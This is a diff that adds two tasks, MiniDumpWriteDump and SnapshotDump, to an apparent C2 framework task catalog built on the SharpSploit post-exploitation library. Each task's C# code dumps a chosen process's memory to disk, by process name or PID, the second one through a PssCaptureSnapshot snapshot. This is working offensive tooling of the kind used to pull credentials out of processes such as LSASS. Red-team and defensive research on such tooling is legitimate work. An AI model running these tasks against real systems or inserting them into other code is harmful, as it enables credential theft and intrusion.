@@ -2144,3 +2144,307 @@
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
+- Name: MiniDumpWriteDump
+  Aliases:
+  - Dump
+  Author:
+    Name: Simone Salucci & Daniel López @ NCC Group
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Generates a minidump that represents the memory of a running process. Uses the MiniDumpWriteDump Win32 API call through PInvoke
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >
+    using System;
+
+    using SharpSploit.Enumeration;
+
+    using System.IO;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string Process, string outputPath, string outputFileName)
+        {
+                if (!Directory.Exists(outputPath))
+                {
+                    return "Dump directory " + outputPath + " not accessible!";
+                }
+                else
+                {
+                    if (Process.All(char.IsDigit)) {
+                        int ProcID = Int32.Parse(Process);
+                        Host.CreateProcessDump(ProcID, outputPath, outputFileName);
+                        return "Dump of the " + Process + " PID should be located at " + outputPath + outputFileName;
+                    }
+                    else
+                    {
+                        Host.CreateProcessDump(Process, outputPath, outputFileName);
+                        return "Dump of the " + Process + " process should be located at " + outputPath + outputFileName;
+                    }
+                    return "There was an error. Please specify either a process name or PID.";
+                }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Process
+    Value: ''
+    DefaultValue: ''
+    Description: Process name or PID
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputPath
+    Value: ''
+    DefaultValue: ''
+    Description: Path where the dump will be stored (e.g. C:\windows\temp\)
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputFileName
+    Value: ''
+    DefaultValue: ''
+    Description: Name used for the dump (e.g. dump.bin)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: SnapshotDump
+  Aliases:
+  - SnapDump
+  Author:
+    Name: Simone Salucci & Daniel López @ NCC Group
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Creates a snapshot of the targeted process using PssCaptureSnapshot (Windows 8.1+ and Windows Server 2012+) and dumps it using MiniDumpWriteDump. The snapshot is cleaned after the dump.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >
+    using System;
+
+    using SharpSploit.Enumeration;
+
+    using System.IO;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string Process, string outputPath, string outputFileName)
+        {
+                if (!Directory.Exists(outputPath))
+                {
+                    return "Dump directory " + outputPath + " not accessible!";
+                }
+                else
+                {
+                    if (Process.All(char.IsDigit)) {
+                        int ProcID = Int32.Parse(Process);
+                        Host.CreateProcessSnapDump(ProcID, outputPath, outputFileName);
+                        return "Dump of the " + Process + " PID should be located at " + outputPath + outputFileName;
+                    }
+                    else
+                    {
+                        Host.CreateProcessSnapDump(Process, outputPath, outputFileName);
+                        return "Dump of the " + Process + " process should be located at " + outputPath + outputFileName;
+                    }
+                    return "There was an error. Please specify either a process name or PID.";
+                }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Process
+    Value: ''
+    DefaultValue: ''
+    Description: Process name or PID
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputPath
+    Value: ''
+    DefaultValue: ''
+    Description: Path where the dump will be stored (e.g. C:\windows\temp\)
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputFileName
+    Value: ''
+    DefaultValue: ''
+    Description: Name used for the dump (e.g. dump.bin)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
